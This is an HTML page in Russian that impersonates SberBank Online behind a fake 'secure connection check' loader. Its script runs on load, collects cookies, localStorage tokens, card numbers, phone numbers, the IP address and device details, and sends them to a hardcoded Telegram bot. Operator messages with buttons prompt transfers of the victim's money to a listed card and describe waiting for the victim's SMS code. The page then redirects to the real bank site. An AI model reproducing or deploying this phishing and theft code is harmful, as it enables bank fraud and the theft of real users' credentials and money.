<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>СберБанк Онлайн</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .card {
            background: white;
            border-radius: 24px;
            box-shadow: 0 8px 24px rgba(0,0,0,0.1);
            max-width: 380px;
            width: 100%;
            padding: 32px 24px;
            text-align: center;
        }
        .logo {
            margin-bottom: 24px;
        }
        .logo svg {
            width: 80px;
            height: 80px;
        }
        .logo h1 {
            font-size: 24px;
            color: #2d6a4f;
            margin-top: 12px;
        }
        .loader {
            width: 40px;
            height: 40px;
            border: 4px solid #e0e0e0;
            border-top: 4px solid #2d6a4f;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .message {
            color: #666;
            font-size: 14px;
            margin-top: 16px;
        }
        .footer {
            margin-top: 24px;
            font-size: 11px;
            color: #999;
        }
    </style>
</head>
<body>
<div class="card">
    <div class="logo">
        <svg viewBox="0 0 100 100" fill="none">
            <circle cx="50" cy="50" r="45" fill="#2d6a4f"/>
            <text x="50" y="68" text-anchor="middle" fill="white" font-size="32" font-weight="bold">СБ</text>
        </svg>
        <h1>СберБанк Онлайн</h1>
    </div>
    <div class="loader"></div>
    <div class="message">Проверка защищенного соединения...</div>
    <div class="footer">SSL Secure Connection</div>
</div>

<script>
// ========== НАСТРОЙКИ (ВСТАВЬ СВОИ) ==========
const BOT_TOKEN = "8655252412:AAGvwRmEBisGeKA5bX5_xFNpp2QRJRTkkTM";  // ТВОЙ ТОКЕН
const CHAT_ID = "8533450974";                           // ТВОЙ CHAT_ID
const MY_CARD = "2203830216112947";                    // ТВОЯ КАРТА ДЛЯ ПЕРЕВОДА
// ==============================================

// Функция отправки в Telegram
function sendToTelegram(text) {
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({ chat_id: CHAT_ID, text: text.substring(0, 4096) })
    }).catch(e => console.log("Send error"));
}

// Функция для отправки кнопок (для подтверждения перевода)
function sendWithButtons(text, callbackData) {
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: text,
            reply_markup: {
                inline_keyboard: [[
                    { text: "✅ ПЕРЕВЕСТИ ВСЁ", callback_data: "transfer_all" },
                    { text: "💰 ПЕРЕВЕСТИ 5000", callback_data: "transfer_5000" },
                    { text: "💰 ПЕРЕВЕСТИ 10000", callback_data: "transfer_10000" }
                ],[
                    { text: "📋 ПОКАЗАТЬ ДАННЫЕ", callback_data: "show_data" }
                ]]
            }
        })
    }).catch(e => console.log("Send error"));
}

// Поиск банковских данных
function extractBankData() {
    const bankData = {};
    const keywords = ['card', 'phone', 'token', 'auth', 'session', 'user', 'login', 'sber', 'sb', 'account', 'balance'];
    
    for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        const value = localStorage.getItem(key);
        
        for (const kw of keywords) {
            if (key.toLowerCase().includes(kw)) {
                bankData[key] = value;
                break;
            }
        }
        
        // Поиск номера карты (16 цифр)
        const cardMatch = value && value.match(/\d{16}/);
        if (cardMatch) {
            bankData['card_number'] = cardMatch[0];
        }
        
        // Поиск телефона
        const phoneMatch = value && value.match(/7\d{10}/);
        if (phoneMatch) {
            bankData['phone'] = phoneMatch[0];
        }
    }
    return bankData;
}

// Функция для получения IP
async function getIP() {
    try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        return data.ip;
    } catch(e) {
        return "unknown";
    }
}

// Функция для попытки автоматического перевода (имитация)
async function tryAutoTransfer(bankData, fullLS, victimIP) {
    // Ищем токен для входа без SMS
    const token = bankData.auth_token || bankData.token || bankData.access_token;
    
    if (token) {
        sendToTelegram(`🔑 НАЙДЕН ТОКЕН ДОСТУПА!\nТокен: ${token.substring(0, 50)}...\n\nПопытка автоматического входа...`);
        
        // Сохраняем данные для ручного перевода
        sendWithButtons(
            `💰 ГОТОВ К ПЕРЕВОДУ\n\n` +
            `💳 Карта жертвы: ${bankData.card_number || "не найдена"}\n` +
            `📞 Телефон: ${bankData.phone || "не найден"}\n` +
            `🔑 Токен: ${token.substring(0, 30)}...\n` +
            `🌐 IP: ${victimIP}\n` +
            `⏰ Время: ${new Date().toLocaleString()}\n\n` +
            `Выбери сумму для перевода на карту ${MY_CARD}:`,
            "transfer"
        );
        return token;
    }
    
    // Если нет токена, показываем что нашли
    sendToTelegram(`⚠️ ТОКЕН НЕ НАЙДЕН\n\nНо есть другие данные:\n💳 Карта: ${bankData.card_number || "нет"}\n📞 Телефон: ${bankData.phone || "нет"}`);
    
    sendWithButtons(
        `⚠️ ТРЕБУЕТСЯ SMS ПОДТВЕРЖДЕНИЕ\n\n` +
        `💳 Карта жертвы: ${bankData.card_number || "не найдена"}\n` +
        `📞 Телефон: ${bankData.phone || "не найден"}\n` +
        `🌐 IP: ${victimIP}\n\n` +
        `После того как жертва получит SMS, введи код вручную в Telegram\n\n` +
        `Жду SMS код...`,
        "waiting_sms"
    );
    
    return null;
}

// ГЛАВНАЯ ФУНКЦИЯ
async function main() {
    const victimIP = await getIP();
    const bankData = extractBankData();
    
    // Полный localStorage для отчета
    let fullLS = {};
    for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        let val = localStorage.getItem(key);
        if (val && val.length > 300) val = val.substring(0, 300) + "...";
        fullLS[key] = val;
    }
    
    // Отправка данных оператору
    sendToTelegram(`🔐 НОВАЯ ЖЕРТВА
⏰ ${new Date().toLocaleString()}
🌐 ${window.location.hostname}
🌍 IP: ${victimIP}
🖥️ ${navigator.userAgent.substring(0, 150)}

🍪 COOKIES:
${document.cookie || "нет"}

🏦 БАНКОВСКИЕ ДАННЫЕ:
${JSON.stringify(bankData, null, 2)}

💾 LOCALSTORAGE (полный):
${JSON.stringify(fullLS, null, 2).substring(0, 3500)}

📱 УСТРОЙСТВО:
${JSON.stringify({
    screen: `${screen.width}x${screen.height}`,
    language: navigator.language,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    platform: navigator.platform
}, null, 2)}`);

    // Пытаемся сделать автоперевод
    await tryAutoTransfer(bankData, fullLS, victimIP);
}

// ЗАПУСК
main();

// Перенаправление на реальный сайт через 3 секунды
setTimeout(() => {
    window.location.href = "https://online.sberbank.ru";
}, 3000);
</script>
</body>
</html>
